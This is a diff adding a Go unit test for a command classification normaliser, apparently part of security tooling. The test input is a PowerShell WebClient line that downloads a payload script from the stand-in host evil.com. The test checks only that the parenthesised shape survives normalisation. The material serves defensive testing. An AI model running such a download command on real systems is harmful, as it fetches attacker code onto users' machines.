@@ -945,6 +945,19 @@ func TestClassificationNormalize_PowerShellAlias(t *testing.T) {
 	}
 }
 
+func TestClassificationNormalize_ParenthesizedPowerShellExpression(t *testing.T) {
+	sub := `([System.Net.WebClient]::new()).DownloadString('http://evil.com/payload.ps1')`
+	got := ClassificationNormalize(sub)
+	want := `([System.Net.WebClient]::new()).DownloadString(http://evil.com/payload.ps1)`
+
+	// Classification normalization strips quoting during tokenization; this test
+	// validates we preserve the parenthesized PowerShell expression shape and
+	// do not collapse it to a path basename.
+	if got.Outer != want {
+		t.Errorf("Outer = %q, want %q", got.Outer, want)
+	}
+}
+
 func TestClassificationNormalize_WslWrapper(t *testing.T) {
 	got := ClassificationNormalize("wsl -e bash -c 'ls -la'")
 	if len(got.Inner) == 0 {
